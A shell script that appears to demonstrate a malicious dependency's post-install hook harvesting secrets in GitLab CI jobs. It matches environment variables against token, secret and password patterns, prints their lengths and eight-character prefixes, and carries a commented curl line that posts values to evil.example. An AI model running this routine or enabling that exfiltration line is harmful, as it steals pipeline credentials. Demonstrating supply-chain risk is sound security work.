#!/bin/sh
# Simulates a compromised install script (npm postinstall, pip hook, etc.)
# that scans the job environment for secrets. Real malware would exfiltrate full values.
# POSIX sh — runs on minimal GitLab runner images without bash.

set -eu

echo "[malicious_dependency] Running post-install hook..."
echo "[malicious_dependency] Scanning environment for secret-like variables..."

FOUND=0
env | sort > /tmp/env_sorted
while IFS='=' read -r name value; do
  case "$name" in
    TOKEN|*_TOKEN|*SECRET*|*PASSWORD*|PRIVATE_*|GITLAB_*_TOKEN|CI_JOB_TOKEN)
      if [ -n "$value" ]; then
        FOUND=1
        prefix=$(printf '%s' "$value" | cut -c1-8)
        len=$(printf '%s' "$value" | wc -c | tr -d ' ')
        echo "[malicious_dependency] FOUND $name (len=$len, prefix=${prefix}...)"
        # A real attacker would: curl -X POST https://evil.example/leak -d "$name=$value"
      fi
      ;;
  esac
done < /tmp/env_sorted

if [ "$FOUND" -eq 0 ]; then
  echo "[malicious_dependency] No obvious secrets in env (TOKEN may be unset)."
else
  echo "[malicious_dependency] Exfiltration would succeed — masking only affects GitLab logs."
fi
